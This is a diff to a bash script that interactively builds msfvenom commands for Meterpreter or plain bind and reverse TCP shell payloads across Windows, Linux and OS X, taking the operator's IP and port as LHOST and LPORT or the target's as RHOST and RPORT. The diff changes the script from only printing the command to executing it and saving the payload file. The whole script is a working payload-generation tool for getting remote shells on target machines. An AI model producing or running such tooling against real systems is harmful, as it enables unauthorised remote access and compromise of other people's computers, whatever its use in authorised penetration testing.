@@ -35,6 +35,7 @@ case  $OS in
 esac
 }
 
+
 case $architecture in
 	32)
 		arc="/x86"
@@ -53,25 +54,24 @@ esac
 echo "Would you like to generate a bind shell or reverse shell? Please enter bind or reverse."
 read shell
 
+ip_port=""
 case $shell in
   reverse)
    	echo "Please enter your IP address."
         read ip
         echo "Please enter the port you would like to listen on."
         read port
+	ip_port="LHOST=$ip LPORT=$port"
     ;;
   bind)
         echo "Please enter your target's IP address."
 	read ip
 	echo "Please enter the remote port."
 	read port
+	ip_port="RHOST=$ip RPORT=$port"
     ;;
 esac
 
-#meterpreter_question(){
-#echo "Would you like to use meterpreter? Please indicate y for yes and n for no."
-#read meterpreter
-#}
 
 echo "What would you like the file format to be? Example: exe, raw, pl, rb, c"
 read format
@@ -79,47 +79,21 @@ read format
 payload=""
 msfgen=""
 
+echo "What would you like to name the file?"
+read filename
+
 use_meterpreter() {
-case  $OS  in
-        windows)
-		msfgen="$payload/${shell}_tcp"
-        ;;
-
-        linux)
-                msfgen="$payload/${shell}_tcp"
-        ;;
-
-        osx)
-                msfgen="$payload/${shell}_tcp"
-        ;;
-
-        *)
-
-esac
+	msfgen="$payload/${shell}_tcp $ip_port -f $format > $filename.$format"
 }
 
 
 no_meterpreter() {
-case  $OS  in
-        windows)
-                msfgen="$payload${shell}_tcp"
-        ;;
-
-        linux)
-                msfgen="$payload${shell}_tcp"
-        ;;
-
-        osx)
-                msfgen="$payload${shell}_tcp"
-        ;;
-        *)
-
-esac
+        msfgen="$payload${shell}_tcp $ip_port -f $format > $filename.$format"
 }
 
 case  $meterpreter  in
 	y)
-	payload="$OS/meterpreter$arc"
+	payload="$OS$arc/meterpreter"
 	use_meterpreter
 	echo "You will be creating a Meterpreter $shell shell payload for $architecture bit $OS in $format format."
         ;;
@@ -131,4 +105,6 @@ case  $meterpreter  in
 	*)
 esac
 
-echo "msfvenom -p $msfgen"
+echo "msfvenom -p $msfgen "
+
+msfvenom -p $msfgen
